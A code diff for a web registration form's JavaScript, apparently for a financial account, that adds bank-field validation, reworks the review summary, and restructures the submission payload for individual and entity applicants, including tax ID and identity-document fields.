+        ["row-accountNumber", "Account Number", () => document.getElementById("accountNumber").value.trim().length > 0, ["accountNumber"], "err-accountNumber"],
+        ["row-accountName", "Name(s) on the Account", () => document.getElementById("accountName").value.trim().length > 0, ["accountName"], "err-accountName"],
+        ["row-bankAccountType", "Bank Account Type", () => document.getElementById("acctChecking").checked || document.getElementById("acctSavings").checked, [], "err-bankAccountType"]
+      );
+
+      return rules;
+    }
+
+    function runValidation() {
+      const rules = buildValidationRules();
+      const failures = [];
+      rules.forEach(([rowId, label, check, inputIds, errId]) => {
+        const passed = check();
+        if (passed) {
+          clearFieldError(inputIds, errId);
+        } else {
+          setFieldError(inputIds, errId);
+          failures.push({ rowId, label });
         }
+      });
+      return failures;
+    }
+
+    function validateStep2AndContinue() {
+      const failures = runValidation();
+      const validationSummary = document.getElementById("validationSummary");
+      const validationList = document.getElementById("validationList");
+
+      if (failures.length > 0) {
+        validationList.innerHTML = failures
+          .map((f) => `<li><a onclick="document.getElementById('${f.rowId}').scrollIntoView({behavior:'smooth', block:'center'});">${f.label}</a></li>`)
+          .join("");
+        validationSummary.classList.add("visible");
+        window.scrollTo({ top: 0, behavior: "smooth" });
+        return;
       }
+
+      validationSummary.classList.remove("visible");
+
+      // Additional non-blocking checks: personalized image caption, security questions
       if (selectedImage && !document.getElementById("personalizedCaption").value.trim()) {
         showAlert("Please enter a caption for your chosen image, or deselect it to skip this step.", "error");
         return;
       }
-
       const q1 = document.getElementById("secQ1").value;
       const q2 = document.getElementById("secQ2").value;
       const q3 = document.getElementById("secQ3").value;
       const anyQuestionFilled = q1 || q2 || q3;
-
       if (anyQuestionFilled) {
         if (!q1 || !q2 || !q3) {
           showAlert("Please select all three security questions, or leave all of them blank to skip this step.", "error");
@@ -1019,31 +1517,35 @@
     }
 
     function buildReview() {
-      const fullName = document.getElementById("fullName").value.trim();
-      const email = document.getElementById("email").value.trim();
+      const isEntity = selectedType !== "individual";
       const typeLabelMap = {
         individual: "Individual", corporation: "Corporation", partnership: "Partnership",
         llc: "LLC", pllc: "PLLC", sole_proprietorship: "Sole Proprietorship",
         deceased_estate: "Deceased Estate", living_estate: "Living Estate", trust: "Trust",
       };
+      const email = document.getElementById("email").value.trim();
 
-      let rows = `
-    <tr><td>Account Type</td><td>${typeLabelMap[selectedType]}</td></tr>
-    <tr><td>Full Name</td><td>${fullName}</td></tr>
-    <tr><td>Email</td><td>${email}</td></tr>
-  `;
-      if (selectedType !== "individual") {
+      let rows = `<tr><td>Account Type</td><td>${typeLabelMap[selectedType]}</td></tr>`;
+
+      if (isEntity) {
+        const mgrName = [document.getElementById("mgrFirst").value, document.getElementById("mgrMiddle").value, document.getElementById("mgrLast").value].filter(Boolean).join(" ");
         rows += `
-      <tr><td>Entity Name</td><td>${document.getElementById("entityName").value}</td></tr>
-      <tr><td>Representative</td><td>${document.getElementById("representativeName").value} (${document.getElementById("representativeRole").value})</td></tr>
-    `;
+          <tr><td>Entity Name</td><td>${document.getElementById("entityName").value}</td></tr>
+          <tr><td>Account Manager</td><td>${mgrName} (${document.getElementById("representativeRole").value})</td></tr>
+        `;
+      } else {
+        rows += `<tr><td>Full Name</td><td>${document.getElementById("fullName").value}</td></tr>`;
       }
+
+      rows += `<tr><td>Email</td><td>${email}</td></tr>`;
+
       const city = document.getElementById("city").value;
       const state = document.getElementById("state").value;
-      if (city || state) rows += `<tr><td>Location</td><td>${[city, state].filter(Boolean).join(", ")}</td></tr>`;
+      if (city || state) rows += `<tr><td>Mailing Location</td><td>${[city, state].filter(Boolean).join(", ")}</td></tr>`;
 
       const bankName = document.getElementById("bankName").value;
-      if (bankName) rows += `<tr><td>Bank</td><td>${bankName}</td></tr>`;
+      const acctType = document.getElementById("acctChecking").checked ? "Checking" : (document.getElementById("acctSavings").checked ? "Savings" : "");
+      if (bankName) rows += `<tr><td>Bank</td><td>${bankName}${acctType ? " (" + acctType + ")" : ""}</td></tr>`;
 
       if (selectedImage) rows += `<tr><td>Personalized Image</td><td>${selectedImage} — "${document.getElementById("personalizedCaption").value}"</td></tr>`;
 
@@ -1061,10 +1563,15 @@
     }
 
     async function submitApplication() {
-      if (!document.getElementById("certifyCheck").checked) {
-        showAlert("You must certify the information before submitting.", "error");
+      const certCheckbox = document.getElementById("certifyCheck");
+      const certError = document.getElementById("certError");
+
+      if (!certCheckbox.checked) {
+        certError.classList.add("visible");
+        window.scrollTo({ top: 0, behavior: "smooth" });
         return;
       }
+      certError.classList.remove("visible");
 
       let recaptchaToken = "";
       if (typeof grecaptcha !== "undefined") {
@@ -1079,14 +1586,35 @@
       submitBtn.disabled = true;
       submitBtn.textContent = "Submitting…";
 
+      const isEntity = selectedType !== "individual";
+
+      // The User schema's top-level fields (name, dateOfBirth, taxIdNumber,
+      // address) represent the PERSON who logs in — for entity accounts,
+      // that's the Account Manager, not the entity itself. The entity's own
+      // registration name/role is carried separately in entityDetails.
+      let name, dateOfBirth, taxIdNumber;
+      if (isEntity) {
+        name = [document.getElementById("mgrFirst").value, document.getElementById("mgrMiddle").value, document.getElementById("mgrLast").value]
+          .filter(Boolean).join(" ").trim();
+        dateOfBirth = document.getElementById("dateOfBirth").value || null;
+        const t1 = document.getElementById("mgrTin1").value.trim();
+        const t2 = document.getElementById("mgrTin2").value.trim();
+        const t3 = document.getElementById("mgrTin3").value.trim();
+        taxIdNumber = (t1 && t2 && t3) ? `${t1}-${t2}-${t3}` : null;
+      } else {
+        name = document.getElementById("fullName").value.trim();
+        dateOfBirth = document.getElementById("dateOfBirth").value || null;
+        taxIdNumber = document.getElementById("taxIdNumber").value.trim() || null;
+      }
+
       const payload = {
-        name: document.getElementById("fullName").value.trim(),
+        name,
         email: document.getElementById("email").value.trim(),
         password: document.getElementById("password").value,
         accountType: selectedType,
-        dateOfBirth: document.getElementById("dateOfBirth").value || null,
-        taxIdNumber: document.getElementById("taxIdNumber").value || null,
-        phoneNumber: document.getElementById("phoneNumber").value || null,
+        dateOfBirth,
+        taxIdNumber,
+        phoneNumber: document.getElementById("phoneNumber").value.trim() || null,
         personalizedImage: selectedImage || null,
         personalizedCaption: document.getElementById("personalizedCaption").value.trim() || null,
         recaptchaToken,
@@ -1102,14 +1630,45 @@
           accountName: document.getElementById("accountName").value || null,
           accountNumber: document.getElementById("accountNumber").value || null,
           routingNumber: document.getElementById("routingNumber").value || null,
+          accountType: document.getElementById("acctChecking").checked ? "checking" : (document.getElementById("acctSavings").checked ? "savings" : null),
+        },
+        identityDocument: {
+          number: document.getElementById("dlNumber").value || null,
+          issuingState: document.getElementById("dlState").value || null,
+          expirationDate: document.getElementById("dlExpiration").value || null,
         },
       };
 
-      if (selectedType !== "individual") {
+      if (isEntity) {
+        const einFilled = isEinFilled();
+        const ssnFilled = isEntitySsnFilled();
+        let entityTaxId = null;
+        let entityTaxIdType = null;
+        if (einFilled) {
+          entityTaxId = `${document.getElementById("einPart1").value.trim()}-${document.getElementById("einPart2").value.trim()}`;
+          entityTaxIdType = "ein";
+        } else if (ssnFilled) {
+          entityTaxId = `${document.getElementById("entitySsnPart1").value.trim()}-${document.getElementById("entitySsnPart2").value.trim()}-${document.getElementById("entitySsnPart3").value.trim()}`;
+          entityTaxIdType = "ssn";
+        }
+        const nameControl = einFilled
+          ? document.getElementById("einNameControl").value.trim() || null
+          : (ssnFilled ? document.getElementById("einNameControl").value.trim() || null : null);
+
         payload.entityDetails = {
           entityName: document.getElementById("entityName").value,
-          representativeName: document.getElementById("representativeName").value,
+          representativeName: name,
           representativeRole: document.getElementById("representativeRole").value,
+          entityTaxId,
+          entityTaxIdType,
+          irsNameControl: nameControl,
+          entityAddress: {
+            street: document.getElementById("entityAddr1").value || null,
+            city: document.getElementById("entityCity").value || null,
+            state: document.getElementById("entityState").value || null,
+            postalCode: document.getElementById("entityZip1").value || null,
+            country: "United States",
+          },
         };
       }
 
